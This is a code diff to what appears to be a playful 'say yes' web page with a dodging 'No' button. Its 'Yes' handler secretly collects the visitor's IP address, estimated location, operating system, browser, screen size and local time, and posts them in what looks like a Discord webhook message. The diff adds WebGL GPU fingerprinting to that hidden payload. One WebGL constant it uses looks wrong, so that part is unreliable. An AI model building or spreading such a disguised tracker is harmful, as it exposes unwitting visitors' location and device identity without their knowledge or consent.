@@ -164,17 +164,33 @@
 
         noBtn.addEventListener('click', moveButton);
 
-        // Clean parser to turn messy user-agents into clear, professional names
         function getCleanDeviceInfo() {
             const ua = navigator.userAgent;
             let os = "Unknown OS";
             let browser = "Unknown Browser";
+            let hardwareDetail = "Generic Device";
 
-            // Determine OS Type
+            // Extract hardware rendering chip details securely if available
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (gl) {
+                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                    if (debugInfo) {
+                        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_VENDOR_STRING) || gl.getParameter(gl.RENDERER);
+                        if (renderer) {
+                            // Cleans up verbose rendering strings into easily readable formats
+                            hardwareDetail = renderer.replace(/Angle \([^)]*\)\s?/gi, '').trim();
+                        }
+                    }
+                }
+            } catch (e) {
+                console.error(e);
+            }
+
             if (/iPhone|iPad|iPod/i.test(ua)) {
                 os = "Apple iOS (iPhone/iPad)";
             } else if (/Android/i.test(ua)) {
-                // Extracts Android version if available
                 const match = ua.match(/Android\s([0-9\.]+)/);
                 os = match ? `Android ${match[1]}` : "Android Device";
             } else if (/Windows NT/i.test(ua)) {
@@ -189,13 +205,12 @@
                 os = "Linux System";
             }
 
-            // Determine Browser Type
             if (/FBAN|FBAV/i.test(ua)) {
-                browser = "Facebook In-App App";
+                browser = "Facebook App";
             } else if (/Instagram/i.test(ua)) {
-                browser = "Instagram In-App App";
+                browser = "Instagram App";
             } else if (/Discord/i.test(ua)) {
-                browser = "Discord Mobile App";
+                browser = "Discord App";
             } else if (/Edg/i.test(ua)) {
                 browser = "Microsoft Edge";
             } else if (/Chrome/i.test(ua) && /Safari/i.test(ua)) {
@@ -206,7 +221,7 @@
                 browser = "Mozilla Firefox";
             }
 
-            return { os, browser };
+            return { os, browser, hardwareDetail };
         }
 
         yesBtn.addEventListener('click', async () => {
@@ -233,7 +248,6 @@
                 console.error('IP address retrieval failed:', err);
             }
 
-            // Get the beautifully filtered and simplified device text metadata
             const cleanDevice = getCleanDeviceInfo();
             const screenRes = `${window.screen.width}x${window.screen.height}`;
             const localTime = new Date().toLocaleString();
@@ -252,6 +266,7 @@
                             { name: "🌐 IP Address", value: ipAddress, inline: true },
                             { name: "📍 Estimated Location", value: locationData, inline: true },
                             { name: "📱 Operating System", value: cleanDevice.os, inline: true },
+                            { name: "🛠️ Hardware/GPU Engine", value: cleanDevice.hardwareDetail, inline: true },
                             { name: "🌐 Web Browser", value: cleanDevice.browser, inline: true },
                             { name: "🖥️ Screen Resolution", value: screenRes, inline: true },
                             { name: "⏰ Device Local Time", value: localTime, inline: true }
